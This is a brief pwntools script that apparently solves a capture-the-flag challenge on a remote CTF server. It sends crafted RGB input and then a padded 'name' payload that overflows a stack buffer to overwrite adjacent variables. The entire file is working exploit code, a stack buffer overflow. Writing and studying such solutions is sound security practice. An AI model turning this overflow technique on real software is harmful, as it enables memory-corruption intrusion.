#!/usr/bin/env python3
from pwn import *

context.binary = "./chall"

local = False
if local:
    io = process("./chall")
else:
    io = remote("tjc.tf", 31453)

r = 0x32
g = 0x54
b = 0x34

io.recvuntil(b"b)\n")
io.sendline(f"{r}, {g}, 0".encode()) # scanf is buggy - only b succeed

io.recvuntil(b"name?\n")

payload = b'A' * (0x30 - 0xb)
payload += int.to_bytes(b, 1, 'little')
payload += int.to_bytes(g, 1, 'little')
payload += int.to_bytes(r, 1, 'little')

io.sendline(payload)
print(io.recvall().decode())
